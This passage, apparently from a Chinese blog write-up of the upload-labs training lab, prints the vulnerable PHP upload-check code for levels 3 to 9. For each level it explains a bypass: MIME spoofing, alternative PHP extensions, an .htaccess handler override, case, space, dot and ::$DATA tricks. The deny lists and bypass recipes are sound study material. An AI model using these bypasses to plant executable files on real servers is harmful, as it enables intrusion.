$img_path = $UPLOAD_ADDR . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">                $is_upload = true;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR.&#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>因为服务端检测的是文件的MIME类型，而对这个MIME类型的的值的获取是通过HTTP请求字段里的Content-Type字段，所以绕过的方法就是通过修改Content-Type的值，比如修改为image/jpeg；image/png；image/gif等等允许上传类型对应的MIME值。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111003.png" alt="image-20210903162459510" style="zoom: 67%;" /><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111925.png" alt="image-20210903162638047" style="zoom:50%;" /><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="文件名后缀绕过"><a href="#文件名后缀绕过" class="headerlink" title="文件名后缀绕过"></a>文件名后缀绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-03/index.php</span><br></pre></td></tr></table></figure><p><strong>检测代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR. &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                 $img_path = $UPLOAD_ADDR .&#x27;/&#x27;. $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><p>用像php3，php5这样的文件名绕过检测，而php会当作php文件执行</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111517.png" alt="image-20210903163709908"></p><h4 id="htaccess文件绕过（只支持apache）"><a href="#htaccess文件绕过（只支持apache）" class="headerlink" title=".htaccess文件绕过（只支持apache）"></a>.htaccess文件绕过（只支持apache）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-04/index.php</span><br></pre></td></tr></table></figure><p>.htaccess文件(或者”分布式配置文件”)提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。</p><p>.htaccess文件内容：</p><p>xxx为要将此后缀的文件解析为php文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;xxx&quot;&gt;  </span><br><span class="line">SetHandler application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><strong>检测代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件不允许上传!&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110470.png" alt="image-20210903164541612"></p><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-05/index.php</span><br></pre></td></tr></table></figure><p><strong>检测代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件不允许上传&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111757.png" alt="image-20210903165225812"></p><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-06/index.php</span><br></pre></td></tr></table></figure><p>通过抓包在文件名后加入空格绕过，windows中如果最后是空格，windows会强行将空格去除。</p><p><strong>检测代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件不允许上传&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110474.png" alt="image-20210903165440377"></p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111571.png" alt="image-20210903165642424" style="zoom:67%;" /><h4 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-07/index.php</span><br></pre></td></tr></table></figure><p>没有对后缀名末尾的点进行处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过</p><p><strong>检测代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件不允许上传&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111044.png" alt="image-20210903165911210"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110087.png" alt="image-20210903165934867"></p><h4 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h4><p>在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-08/index.php</span><br></pre></td></tr></table></figure><p><strong>检测代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件不允许上传&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111934.png" alt="image-20210903170321326"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111677.png" alt="image-20210903170503461"></p><h4 id="点空格点绕过"><a href="#点空格点绕过" class="headerlink" title="点空格点绕过"></a>点空格点绕过</h4><p>通过<code>. .</code>来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-09/index.php</span><br></pre></td></tr></table></figure><p><strong>检测代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件不允许上传&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br><span class="line">这里只进行了一次该代码</span><br><span class="line">我们通过.php. .的方式进行绕过，第一次删除了最后面的点变成.php. 第二次去空变成了.php.的形式，所以还可以绕过。</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111082.png" alt="image-20210903171342167"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110160.png" alt="image-20210903171405035"></p><h4 